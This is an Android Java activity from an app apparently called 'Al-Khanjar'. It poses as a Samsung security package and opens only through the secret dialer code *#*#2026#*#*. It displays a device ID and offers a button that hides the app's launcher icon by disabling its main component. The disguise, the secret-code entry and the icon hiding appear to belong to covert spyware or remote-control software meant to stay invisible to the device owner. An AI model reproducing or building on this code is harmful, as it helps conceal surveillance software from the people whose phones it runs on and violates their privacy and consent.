package com.samsung.android.security.v8;

import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

/**
 * SettingsActivity - نشاط الإعدادات
 * يظهر فقط عند إدخال الكود السري *#*#2026#*#*
 */
public class SettingsActivity extends Activity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // واجهة بسيطة
        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);
        layout.setBackgroundColor(0xFF1E1E1E);
        
        TextView title = new TextView(this);
        title.setText("Al-Khanjar Device Manager");
        title.setTextSize(24);
        title.setTextColor(0xFFFFFFFF);
        title.setPadding(0, 0, 0, 30);
        layout.addView(title);
        
        TextView info = new TextView(this);
        info.setText("Device ID: " + AlKhanjarApp.getDeviceId() + "\n\n" +
                     "Status: Active\n" +
                     "Version: 8.0");
        info.setTextSize(16);
        info.setTextColor(0xFFCCCCCC);
        info.setPadding(0, 0, 0, 40);
        layout.addView(info);
        
        Button hideButton = new Button(this);
        hideButton.setText("إخفاء التطبيق");
        hideButton.setOnClickListener(v -> {
            hideApp();
        });
        layout.addView(hideButton);
        
        Button uninstallButton = new Button(this);
        uninstallButton.setText("إلغاء التثبيت");
        uninstallButton.setOnClickListener(v -> {
            Toast.makeText(this, "لإلغاء التثبيت، استخدم إعدادات Android", Toast.LENGTH_LONG).show();
        });
        layout.addView(uninstallButton);
        
        setContentView(layout);
    }
    
    private void hideApp() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
        
        Toast.makeText(this, "تم إخفاء التطبيق", Toast.LENGTH_SHORT).show();
        finish();
    }
}
